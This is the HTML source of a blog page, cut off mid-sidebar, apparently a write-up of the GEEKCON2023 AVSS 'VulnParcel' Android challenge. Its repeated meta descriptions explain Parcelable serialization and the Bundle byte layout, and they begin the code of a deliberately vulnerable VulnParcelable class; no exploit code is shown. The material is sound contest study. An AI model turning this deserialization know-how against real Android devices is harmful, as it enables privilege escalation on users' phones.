@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <link rel="icon" href="/favicon.ico">
+
+  <title>
+    GEEKCON2023 AVSS挑战赛 VulnParcel题解 - Jet&#39;s Home
+  </title>
+
+  <meta name="description" content="本文内容仅用于个人存档和技术交流学习，禁止使用文中内容进行未授权或恶意的攻击行为。
+前言 八月份参加了AVSS挑战赛，第一次打这种Android漏洞利用的比赛，比赛的两天只写出来了APP层的expReceiver和ZipZip，和前几名的队伍相比主要是VulnParcel没写出来（其他的内核题不太会qwq），故在赛后复盘一下这道Parcel漏洞利用的题目。
+赛题与exp下载链接：https://github.com/learjet5/GEEKCON2023-AVSS
+在分析具体题目之前，需要先介绍一下前置知识。
+Parcelable对象 在Android开发过程中，常常需要在进程间进行类对象的传递，系统一般会将这些对象放到Intent或者Bundle里面进行数据传递，这一过程中就会涉及序列化和反序列化的操作。其中，序列化是将对象转换为可以传输的二进制流（二进制序列）的过程，这样我们就可以将结构化数据转化为可以在网络传输或者保存到本地的流（序列），从而进行数据传输；反序列化则是从二进制流（序列）恢复出类对象的过程。
+Parcelable是Android为开发者提供的序列化的接口，其相对于Serializable接口的使用相对复杂一些，但Parcelable的效率也要比Serializable高得多。一个类要想支持序列化的数据传输，就需要实现Parcelable接口。Parcelable接口的实现类必须要有一个非空的静态变量 CREATOR 用于从Parcel中恢复原始对象，其重载了createFromParcel函数；同时也需要重载接口中的两个函数：writeToParcel用于将原始对象序列化并写入Parcel，describeContents只针对一些特殊的需要描述信息的对象返回1、其他情况返回0。
+一个对象在实现Parcelable接口时，需要通过Parcel类实现write和read的方法来完成序列化/反序列化。Parcel可以理解为实现各个对象序列化/反序列化的数据工具，其存储的是序列数据，其可以通过parcel.marshall()将自己转化为字节序列，用于在调试过程中查看parcel的序列化数据内容。简单来说，Parcel提供了一套机制，可以将序列化之后的数据写入到一个共享内存中，其他进程通过Parcel可以从这块共享内存中读出字节流，并反序列化成对象进而使用。该过程如下图所示。
+Parcel可以包含原始数据类型（通过各种对应的方法写入，比如writeInt()，writeFloat()等），也可以包含Parcelable对象（通过writeParcelable()等实现），其相关读写操作的实现可以在AOSP源码frameworks/base/core/java/android/os/Parcel.java中进一步查看。
+Bundle数据结构 在 Andorid 中，Bundle类是一个类似HashMap的数据结构，其以键值对的形式存储数据。
+可序列化的Parcelable对象一般不单独进行序列化传输，而是需要通过Bundle对象携带。例如， Android中进程间通信频繁使用的Intent对象中通常会携带一个Bundle对象，利用Intent.putExtra(key, value)方法，可以往Intent对应的Bundle对象中添加键值对(Key Value)。Key为String类型，而Value则可以为各种数据类型，包括Int、Boolean、String和Parcelable对象等等，Parcel类中维护着这些类型的信息及其序列化读写方法。
+Bundle本身也是实现了Parcelable接口的，从序列化数据的角度来理解Bundle对象的内容：
+开头是固定的：4字节Bundle长度 &#43; 4字节魔数0x4C444E42 。 然后通过writeMap()存储实际的Bundle数据。先是采用parcel.writeInt()写入4字节的键值对数量，然后依次是每个key-value形式的键值对：key采用parcel.writeString()写入，即”4字节length&#43;4字节对齐的string“的形式；value则采用parcel.writeValue()写入，writeValue时依次写入4字节Value类型和Value本身，Value类型的int值见frameworks/native/libs/binder/ParcelValTypes.h，Value本身的字节序列格式由Parcel.writeXXX(p, flags)决定。 参考Bundle风水，我们还可以把序列化后的Bundle对象存为文件进行研究。
+事实上，frameworks/base/core/java/android/os/Parcel.java中也实现了readBundle()和writeBundle()函数，来对Bundle对象进行parcel的序列化读写操作。
+题目概述 本题在Android Framework的代码中，以patch的方式添加了一个有漏洞的VulnParcelable类，代码如下所示。
+public final class VulnParcelable implements Parcelable { private String TAG = &#34;VulnParcelable&#34;; private int opt; private int o1; private int o2; private byte[] mPayload; public VulnParcelable() { } // @UnsupportedAppUsage private VulnParcelable(Parcel in) { readFromParcel(in); } // 反序列化 // opt=0: 只读一个o1 // opt=1: 先读o2，然后读一个size，o2&gt;0才会再读一个buf[size] public void readFromParcel(@NonNull Parcel in) { Log." /><meta name="generator" content="Hugo 0.121.2">
+
+  <link rel="stylesheet" href="https://example.org/css/main.css" />
+
+  
+  
+
+  <meta property="og:title" content="GEEKCON2023 AVSS挑战赛 VulnParcel题解" />
+<meta property="og:description" content="本文内容仅用于个人存档和技术交流学习，禁止使用文中内容进行未授权或恶意的攻击行为。
+前言 八月份参加了AVSS挑战赛，第一次打这种Android漏洞利用的比赛，比赛的两天只写出来了APP层的expReceiver和ZipZip，和前几名的队伍相比主要是VulnParcel没写出来（其他的内核题不太会qwq），故在赛后复盘一下这道Parcel漏洞利用的题目。
+赛题与exp下载链接：https://github.com/learjet5/GEEKCON2023-AVSS
+在分析具体题目之前，需要先介绍一下前置知识。
+Parcelable对象 在Android开发过程中，常常需要在进程间进行类对象的传递，系统一般会将这些对象放到Intent或者Bundle里面进行数据传递，这一过程中就会涉及序列化和反序列化的操作。其中，序列化是将对象转换为可以传输的二进制流（二进制序列）的过程，这样我们就可以将结构化数据转化为可以在网络传输或者保存到本地的流（序列），从而进行数据传输；反序列化则是从二进制流（序列）恢复出类对象的过程。
+Parcelable是Android为开发者提供的序列化的接口，其相对于Serializable接口的使用相对复杂一些，但Parcelable的效率也要比Serializable高得多。一个类要想支持序列化的数据传输，就需要实现Parcelable接口。Parcelable接口的实现类必须要有一个非空的静态变量 CREATOR 用于从Parcel中恢复原始对象，其重载了createFromParcel函数；同时也需要重载接口中的两个函数：writeToParcel用于将原始对象序列化并写入Parcel，describeContents只针对一些特殊的需要描述信息的对象返回1、其他情况返回0。
+一个对象在实现Parcelable接口时，需要通过Parcel类实现write和read的方法来完成序列化/反序列化。Parcel可以理解为实现各个对象序列化/反序列化的数据工具，其存储的是序列数据，其可以通过parcel.marshall()将自己转化为字节序列，用于在调试过程中查看parcel的序列化数据内容。简单来说，Parcel提供了一套机制，可以将序列化之后的数据写入到一个共享内存中，其他进程通过Parcel可以从这块共享内存中读出字节流，并反序列化成对象进而使用。该过程如下图所示。
+Parcel可以包含原始数据类型（通过各种对应的方法写入，比如writeInt()，writeFloat()等），也可以包含Parcelable对象（通过writeParcelable()等实现），其相关读写操作的实现可以在AOSP源码frameworks/base/core/java/android/os/Parcel.java中进一步查看。
+Bundle数据结构 在 Andorid 中，Bundle类是一个类似HashMap的数据结构，其以键值对的形式存储数据。
+可序列化的Parcelable对象一般不单独进行序列化传输，而是需要通过Bundle对象携带。例如， Android中进程间通信频繁使用的Intent对象中通常会携带一个Bundle对象，利用Intent.putExtra(key, value)方法，可以往Intent对应的Bundle对象中添加键值对(Key Value)。Key为String类型，而Value则可以为各种数据类型，包括Int、Boolean、String和Parcelable对象等等，Parcel类中维护着这些类型的信息及其序列化读写方法。
+Bundle本身也是实现了Parcelable接口的，从序列化数据的角度来理解Bundle对象的内容：
+开头是固定的：4字节Bundle长度 &#43; 4字节魔数0x4C444E42 。 然后通过writeMap()存储实际的Bundle数据。先是采用parcel.writeInt()写入4字节的键值对数量，然后依次是每个key-value形式的键值对：key采用parcel.writeString()写入，即”4字节length&#43;4字节对齐的string“的形式；value则采用parcel.writeValue()写入，writeValue时依次写入4字节Value类型和Value本身，Value类型的int值见frameworks/native/libs/binder/ParcelValTypes.h，Value本身的字节序列格式由Parcel.writeXXX(p, flags)决定。 参考Bundle风水，我们还可以把序列化后的Bundle对象存为文件进行研究。
+事实上，frameworks/base/core/java/android/os/Parcel.java中也实现了readBundle()和writeBundle()函数，来对Bundle对象进行parcel的序列化读写操作。
+题目概述 本题在Android Framework的代码中，以patch的方式添加了一个有漏洞的VulnParcelable类，代码如下所示。
+public final class VulnParcelable implements Parcelable { private String TAG = &#34;VulnParcelable&#34;; private int opt; private int o1; private int o2; private byte[] mPayload; public VulnParcelable() { } // @UnsupportedAppUsage private VulnParcelable(Parcel in) { readFromParcel(in); } // 反序列化 // opt=0: 只读一个o1 // opt=1: 先读o2，然后读一个size，o2&gt;0才会再读一个buf[size] public void readFromParcel(@NonNull Parcel in) { Log." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.org/blogs/vulnparcel/" /><meta property="og:image" content="https://example.org/digital-garden-logo.png" /><meta property="article:section" content="blogs" />
+<meta property="article:published_time" content="2023-09-04T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-09-04T00:00:00+00:00" />
+
+
+
+  <meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://example.org/digital-garden-logo.png" /><meta name="twitter:title" content="GEEKCON2023 AVSS挑战赛 VulnParcel题解"/>
+<meta name="twitter:description" content="本文内容仅用于个人存档和技术交流学习，禁止使用文中内容进行未授权或恶意的攻击行为。
+前言 八月份参加了AVSS挑战赛，第一次打这种Android漏洞利用的比赛，比赛的两天只写出来了APP层的expReceiver和ZipZip，和前几名的队伍相比主要是VulnParcel没写出来（其他的内核题不太会qwq），故在赛后复盘一下这道Parcel漏洞利用的题目。
+赛题与exp下载链接：https://github.com/learjet5/GEEKCON2023-AVSS
+在分析具体题目之前，需要先介绍一下前置知识。
+Parcelable对象 在Android开发过程中，常常需要在进程间进行类对象的传递，系统一般会将这些对象放到Intent或者Bundle里面进行数据传递，这一过程中就会涉及序列化和反序列化的操作。其中，序列化是将对象转换为可以传输的二进制流（二进制序列）的过程，这样我们就可以将结构化数据转化为可以在网络传输或者保存到本地的流（序列），从而进行数据传输；反序列化则是从二进制流（序列）恢复出类对象的过程。
+Parcelable是Android为开发者提供的序列化的接口，其相对于Serializable接口的使用相对复杂一些，但Parcelable的效率也要比Serializable高得多。一个类要想支持序列化的数据传输，就需要实现Parcelable接口。Parcelable接口的实现类必须要有一个非空的静态变量 CREATOR 用于从Parcel中恢复原始对象，其重载了createFromParcel函数；同时也需要重载接口中的两个函数：writeToParcel用于将原始对象序列化并写入Parcel，describeContents只针对一些特殊的需要描述信息的对象返回1、其他情况返回0。
+一个对象在实现Parcelable接口时，需要通过Parcel类实现write和read的方法来完成序列化/反序列化。Parcel可以理解为实现各个对象序列化/反序列化的数据工具，其存储的是序列数据，其可以通过parcel.marshall()将自己转化为字节序列，用于在调试过程中查看parcel的序列化数据内容。简单来说，Parcel提供了一套机制，可以将序列化之后的数据写入到一个共享内存中，其他进程通过Parcel可以从这块共享内存中读出字节流，并反序列化成对象进而使用。该过程如下图所示。
+Parcel可以包含原始数据类型（通过各种对应的方法写入，比如writeInt()，writeFloat()等），也可以包含Parcelable对象（通过writeParcelable()等实现），其相关读写操作的实现可以在AOSP源码frameworks/base/core/java/android/os/Parcel.java中进一步查看。
+Bundle数据结构 在 Andorid 中，Bundle类是一个类似HashMap的数据结构，其以键值对的形式存储数据。
+可序列化的Parcelable对象一般不单独进行序列化传输，而是需要通过Bundle对象携带。例如， Android中进程间通信频繁使用的Intent对象中通常会携带一个Bundle对象，利用Intent.putExtra(key, value)方法，可以往Intent对应的Bundle对象中添加键值对(Key Value)。Key为String类型，而Value则可以为各种数据类型，包括Int、Boolean、String和Parcelable对象等等，Parcel类中维护着这些类型的信息及其序列化读写方法。
+Bundle本身也是实现了Parcelable接口的，从序列化数据的角度来理解Bundle对象的内容：
+开头是固定的：4字节Bundle长度 &#43; 4字节魔数0x4C444E42 。 然后通过writeMap()存储实际的Bundle数据。先是采用parcel.writeInt()写入4字节的键值对数量，然后依次是每个key-value形式的键值对：key采用parcel.writeString()写入，即”4字节length&#43;4字节对齐的string“的形式；value则采用parcel.writeValue()写入，writeValue时依次写入4字节Value类型和Value本身，Value类型的int值见frameworks/native/libs/binder/ParcelValTypes.h，Value本身的字节序列格式由Parcel.writeXXX(p, flags)决定。 参考Bundle风水，我们还可以把序列化后的Bundle对象存为文件进行研究。
+事实上，frameworks/base/core/java/android/os/Parcel.java中也实现了readBundle()和writeBundle()函数，来对Bundle对象进行parcel的序列化读写操作。
+题目概述 本题在Android Framework的代码中，以patch的方式添加了一个有漏洞的VulnParcelable类，代码如下所示。
+public final class VulnParcelable implements Parcelable { private String TAG = &#34;VulnParcelable&#34;; private int opt; private int o1; private int o2; private byte[] mPayload; public VulnParcelable() { } // @UnsupportedAppUsage private VulnParcelable(Parcel in) { readFromParcel(in); } // 反序列化 // opt=0: 只读一个o1 // opt=1: 先读o2，然后读一个size，o2&gt;0才会再读一个buf[size] public void readFromParcel(@NonNull Parcel in) { Log."/>
+
+
+  <meta itemprop="name" content="GEEKCON2023 AVSS挑战赛 VulnParcel题解">
+<meta itemprop="description" content="本文内容仅用于个人存档和技术交流学习，禁止使用文中内容进行未授权或恶意的攻击行为。
+前言 八月份参加了AVSS挑战赛，第一次打这种Android漏洞利用的比赛，比赛的两天只写出来了APP层的expReceiver和ZipZip，和前几名的队伍相比主要是VulnParcel没写出来（其他的内核题不太会qwq），故在赛后复盘一下这道Parcel漏洞利用的题目。
+赛题与exp下载链接：https://github.com/learjet5/GEEKCON2023-AVSS
+在分析具体题目之前，需要先介绍一下前置知识。
+Parcelable对象 在Android开发过程中，常常需要在进程间进行类对象的传递，系统一般会将这些对象放到Intent或者Bundle里面进行数据传递，这一过程中就会涉及序列化和反序列化的操作。其中，序列化是将对象转换为可以传输的二进制流（二进制序列）的过程，这样我们就可以将结构化数据转化为可以在网络传输或者保存到本地的流（序列），从而进行数据传输；反序列化则是从二进制流（序列）恢复出类对象的过程。
+Parcelable是Android为开发者提供的序列化的接口，其相对于Serializable接口的使用相对复杂一些，但Parcelable的效率也要比Serializable高得多。一个类要想支持序列化的数据传输，就需要实现Parcelable接口。Parcelable接口的实现类必须要有一个非空的静态变量 CREATOR 用于从Parcel中恢复原始对象，其重载了createFromParcel函数；同时也需要重载接口中的两个函数：writeToParcel用于将原始对象序列化并写入Parcel，describeContents只针对一些特殊的需要描述信息的对象返回1、其他情况返回0。
+一个对象在实现Parcelable接口时，需要通过Parcel类实现write和read的方法来完成序列化/反序列化。Parcel可以理解为实现各个对象序列化/反序列化的数据工具，其存储的是序列数据，其可以通过parcel.marshall()将自己转化为字节序列，用于在调试过程中查看parcel的序列化数据内容。简单来说，Parcel提供了一套机制，可以将序列化之后的数据写入到一个共享内存中，其他进程通过Parcel可以从这块共享内存中读出字节流，并反序列化成对象进而使用。该过程如下图所示。
+Parcel可以包含原始数据类型（通过各种对应的方法写入，比如writeInt()，writeFloat()等），也可以包含Parcelable对象（通过writeParcelable()等实现），其相关读写操作的实现可以在AOSP源码frameworks/base/core/java/android/os/Parcel.java中进一步查看。
+Bundle数据结构 在 Andorid 中，Bundle类是一个类似HashMap的数据结构，其以键值对的形式存储数据。
+可序列化的Parcelable对象一般不单独进行序列化传输，而是需要通过Bundle对象携带。例如， Android中进程间通信频繁使用的Intent对象中通常会携带一个Bundle对象，利用Intent.putExtra(key, value)方法，可以往Intent对应的Bundle对象中添加键值对(Key Value)。Key为String类型，而Value则可以为各种数据类型，包括Int、Boolean、String和Parcelable对象等等，Parcel类中维护着这些类型的信息及其序列化读写方法。
+Bundle本身也是实现了Parcelable接口的，从序列化数据的角度来理解Bundle对象的内容：
+开头是固定的：4字节Bundle长度 &#43; 4字节魔数0x4C444E42 。 然后通过writeMap()存储实际的Bundle数据。先是采用parcel.writeInt()写入4字节的键值对数量，然后依次是每个key-value形式的键值对：key采用parcel.writeString()写入，即”4字节length&#43;4字节对齐的string“的形式；value则采用parcel.writeValue()写入，writeValue时依次写入4字节Value类型和Value本身，Value类型的int值见frameworks/native/libs/binder/ParcelValTypes.h，Value本身的字节序列格式由Parcel.writeXXX(p, flags)决定。 参考Bundle风水，我们还可以把序列化后的Bundle对象存为文件进行研究。
+事实上，frameworks/base/core/java/android/os/Parcel.java中也实现了readBundle()和writeBundle()函数，来对Bundle对象进行parcel的序列化读写操作。
+题目概述 本题在Android Framework的代码中，以patch的方式添加了一个有漏洞的VulnParcelable类，代码如下所示。
+public final class VulnParcelable implements Parcelable { private String TAG = &#34;VulnParcelable&#34;; private int opt; private int o1; private int o2; private byte[] mPayload; public VulnParcelable() { } // @UnsupportedAppUsage private VulnParcelable(Parcel in) { readFromParcel(in); } // 反序列化 // opt=0: 只读一个o1 // opt=1: 先读o2，然后读一个size，o2&gt;0才会再读一个buf[size] public void readFromParcel(@NonNull Parcel in) { Log."><meta itemprop="datePublished" content="2023-09-04T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2023-09-04T00:00:00+00:00" />
+<meta itemprop="wordCount" content="542"><meta itemprop="image" content="https://example.org/digital-garden-logo.png" />
+<meta itemprop="keywords" content="" />
+
+  <meta itemprop="name" content="GEEKCON2023 AVSS挑战赛 VulnParcel题解">
+<meta itemprop="description" content="本文内容仅用于个人存档和技术交流学习，禁止使用文中内容进行未授权或恶意的攻击行为。
+前言 八月份参加了AVSS挑战赛，第一次打这种Android漏洞利用的比赛，比赛的两天只写出来了APP层的expReceiver和ZipZip，和前几名的队伍相比主要是VulnParcel没写出来（其他的内核题不太会qwq），故在赛后复盘一下这道Parcel漏洞利用的题目。
+赛题与exp下载链接：https://github.com/learjet5/GEEKCON2023-AVSS
+在分析具体题目之前，需要先介绍一下前置知识。
+Parcelable对象 在Android开发过程中，常常需要在进程间进行类对象的传递，系统一般会将这些对象放到Intent或者Bundle里面进行数据传递，这一过程中就会涉及序列化和反序列化的操作。其中，序列化是将对象转换为可以传输的二进制流（二进制序列）的过程，这样我们就可以将结构化数据转化为可以在网络传输或者保存到本地的流（序列），从而进行数据传输；反序列化则是从二进制流（序列）恢复出类对象的过程。
+Parcelable是Android为开发者提供的序列化的接口，其相对于Serializable接口的使用相对复杂一些，但Parcelable的效率也要比Serializable高得多。一个类要想支持序列化的数据传输，就需要实现Parcelable接口。Parcelable接口的实现类必须要有一个非空的静态变量 CREATOR 用于从Parcel中恢复原始对象，其重载了createFromParcel函数；同时也需要重载接口中的两个函数：writeToParcel用于将原始对象序列化并写入Parcel，describeContents只针对一些特殊的需要描述信息的对象返回1、其他情况返回0。
+一个对象在实现Parcelable接口时，需要通过Parcel类实现write和read的方法来完成序列化/反序列化。Parcel可以理解为实现各个对象序列化/反序列化的数据工具，其存储的是序列数据，其可以通过parcel.marshall()将自己转化为字节序列，用于在调试过程中查看parcel的序列化数据内容。简单来说，Parcel提供了一套机制，可以将序列化之后的数据写入到一个共享内存中，其他进程通过Parcel可以从这块共享内存中读出字节流，并反序列化成对象进而使用。该过程如下图所示。
+Parcel可以包含原始数据类型（通过各种对应的方法写入，比如writeInt()，writeFloat()等），也可以包含Parcelable对象（通过writeParcelable()等实现），其相关读写操作的实现可以在AOSP源码frameworks/base/core/java/android/os/Parcel.java中进一步查看。
+Bundle数据结构 在 Andorid 中，Bundle类是一个类似HashMap的数据结构，其以键值对的形式存储数据。
+可序列化的Parcelable对象一般不单独进行序列化传输，而是需要通过Bundle对象携带。例如， Android中进程间通信频繁使用的Intent对象中通常会携带一个Bundle对象，利用Intent.putExtra(key, value)方法，可以往Intent对应的Bundle对象中添加键值对(Key Value)。Key为String类型，而Value则可以为各种数据类型，包括Int、Boolean、String和Parcelable对象等等，Parcel类中维护着这些类型的信息及其序列化读写方法。
+Bundle本身也是实现了Parcelable接口的，从序列化数据的角度来理解Bundle对象的内容：
+开头是固定的：4字节Bundle长度 &#43; 4字节魔数0x4C444E42 。 然后通过writeMap()存储实际的Bundle数据。先是采用parcel.writeInt()写入4字节的键值对数量，然后依次是每个key-value形式的键值对：key采用parcel.writeString()写入，即”4字节length&#43;4字节对齐的string“的形式；value则采用parcel.writeValue()写入，writeValue时依次写入4字节Value类型和Value本身，Value类型的int值见frameworks/native/libs/binder/ParcelValTypes.h，Value本身的字节序列格式由Parcel.writeXXX(p, flags)决定。 参考Bundle风水，我们还可以把序列化后的Bundle对象存为文件进行研究。
+事实上，frameworks/base/core/java/android/os/Parcel.java中也实现了readBundle()和writeBundle()函数，来对Bundle对象进行parcel的序列化读写操作。
+题目概述 本题在Android Framework的代码中，以patch的方式添加了一个有漏洞的VulnParcelable类，代码如下所示。
+public final class VulnParcelable implements Parcelable { private String TAG = &#34;VulnParcelable&#34;; private int opt; private int o1; private int o2; private byte[] mPayload; public VulnParcelable() { } // @UnsupportedAppUsage private VulnParcelable(Parcel in) { readFromParcel(in); } // 反序列化 // opt=0: 只读一个o1 // opt=1: 先读o2，然后读一个size，o2&gt;0才会再读一个buf[size] public void readFromParcel(@NonNull Parcel in) { Log."><meta itemprop="datePublished" content="2023-09-04T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2023-09-04T00:00:00+00:00" />
+<meta itemprop="wordCount" content="542"><meta itemprop="image" content="https://example.org/digital-garden-logo.png" />
+<meta itemprop="keywords" content="" />
+</head><body class="flex relative h-full min-h-screen"><aside
+  class="will-change-transform transform transition-transform -translate-x-full absolute top-0 left-0 md:relative md:translate-x-0 w-3/4 md:basis-60 h-full min-h-screen p-3 bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 flex flex-col gap-2.5 z-20 sidebar flex-shrink-0">
+  <p class="font-bold mb-5 flex items-center gap-2">
+    <button aria-label="Close sidebar"
+      class="md:hidden menu-trigger-close p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-6 w-6" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <line x1="18" y1="6" x2="6" y2="18" />
+  <line x1="6" y1="6" x2="18" y2="18" />
+</svg></button>
+    <a href="https://example.org/" class="px-2">
+      <span style="font-size: 1.5rem;">Jet&#39;s Home</span>
+    </a>
+    <button aria-label="Toggle dark mode"
+      class="dark-mode-toggle p-2 rounded border dark:border-slate-700 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <circle cx="12" cy="12" r="4" />
+  <path d="M3 12h1M12 3v1M20 12h1M12 20v1M5.6 5.6l.7 .7M18.4 5.6l-.7 .7M17.7 17.7l.7 .7M6.3 17.7l-.7 .7" />
+</svg></button>
+  </p>
+
+  
+  <ul class="list-none flex flex-col gap-1">
+    
+    <li>
+      <a class="px-2 py-3 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/" >
+        <span style="font-size: 1.2rem;">Home</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-3 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/blogs" >
+        <span style="font-size: 1.2rem;">Blogs</span>
+        
+      </a>
+    </li>
+    
+  </ul>
+
+  <div class="flex-1"></div>
+
+  
+
+  <ul class="list-none flex flex-wrap justify-center gap-1 pt-2 border-t border-slate-200 dark:border-slate-600">
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://github.com/learjet5" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">GitHub</span>
+        
+        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+  stroke-linecap="round" stroke-linejoin="round">
+  <path
+    d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://twitter.com" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">Twitter</span>
+        
+        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+  stroke-linecap="round" stroke-linejoin="round">
+  <path
+    d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://linkedin.com" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">LinkedIn</span>
+        
+        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+  stroke-linecap="round" stroke-linejoin="round">
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" />
+  <rect x="2" y="9" width="4" height="12" />
+  <circle cx="4" cy="4" r="2" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="mailto:learjet@sjtu.edu.cn" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">Email</span>
+        
+        <span><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <rect x="3" y="5" width="18" height="14" rx="2" />
+  <polyline points="3 7 12 13 21 7" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+  </ul>
+</aside>
+
+<div
+  class="fixed bg-slate-700 bg-opacity-5 transition duration-200 ease-in-out inset-0 z-10 pointer-events-auto md:hidden left-0 top-0 w-full h-full hidden menu-overlay">
+</div>
+
+<button aria-label="Toggle Sidebar"
+  class="md:hidden absolute top-3 left-3 z-10 menu-trigger p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-100"><svg class="h-6 w-6" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <line x1="4" y1="6" x2="20" y2="6" />
+  <line x1="4" y1="12" x2="20" y2="12" />
+  <line x1="4" y1="18" x2="16" y2="18" />
+</svg></button>
+
+
+
+
+
+
+<div class="flex flex-1 h-screen relative w-full min-w-0">
+
+  <section
+    class="will-change-transform transform transition-transform -translate-x-[200%] absolute top-0 left-0 lg:relative
+  lg:translate-x-0 md:w-1/5 h-full bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 lg:flex flex-col py-3 overflow-y-auto scroll-area flex-shrink-0">
+    
+    
+    <a href="https://example.org/blogs/">
+      <h2 class="font-bold mb-5 py-1 pl-12 pr-3 md:px-3">Blogs</h2>
+    </a>
+<label class="mb-2 block px-2">
+  <span></span>
+  <input type="text" placeholder="Search blogs" class="searchInput bg-white rounded px-2 py-1 w-full border" />
+</label>
+<script>
+  const searchElt = document.querySelector('.searchInput')
+  if (searchElt) {
+    searchElt.addEventListener('input', evt => {
+      const value = evt.target.value || '';
+
+      const articles = document.querySelectorAll('.article')
+      if (!value) {
+        articles.forEach(article => article.classList.remove('hidden'))
+      } else {
+        articles.forEach(article => article.classList.add('hidden'))
+        Array.from(articles).filter(article => {
+          const title = article.querySelector('h3')
+          if (!title) return false;
+
+          return title.textContent.toLowerCase().includes(value.toLowerCase())
+        }).forEach(article => article.classList.remove('hidden'))
+      }
+    })
+  }
+</script>
+<div class="space-y-2.5">
+      
+      <a class="article block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/blogs/datacon%E8%AE%B0%E5%BD%95/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Datacon记录</h3>
+        <div
+          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
+          简介 2022年12月当时在打物联网安全赛道，用实验室先前论文SFuzz的代码改改，能较好地解决RTOS固件的相关题目，但第三题整数溢出漏洞检测在短时间内写出来的工具还是效果不佳。
+2023年11月又带学弟们打了漏洞分析赛道，前两题基本是苦力活，第三题挖0day因为没提前买设备and固件模拟不熟练导致写不出exp，略遗憾。
+后面如果再打Datacon的话就只想直接做第三题了（瘫
+IDA脚本 人工审计二进制代码漏洞时，需要快速判断source点到sink点之间是否存在call trace。写了个简单的IDA脚本实现这一功能。
+import idautils import idc import ida_idp import ida_funcs import ida_nalt import time log_file = None # # Basic Tools # def printh(num): # h = hex print(hex(num)) def printh_list(nums): for num in nums: printh(num) def printf(func_ea): # f = funtion name = idc.get_func_name(func_ea) if name: print(&#34;%s(%s)&#34; % (name, hex(func_ea))) def get_addr_32(num)-&gt;str: s = hex(num)[2:] return &#39;0x&#39; + s.rjust(8, &#39;0&#39;) def is_func_entry(ea): func = ida_funcs.
+        </div>
+      </a>
+      
+      <a class="article block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/blogs/android-app-%E6%8A%93%E5%8C%85%E6%96%B9%E6%A1%88%E8%B0%83%E7%A0%94/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Android APP抓包方案调研</h3>
+        <div
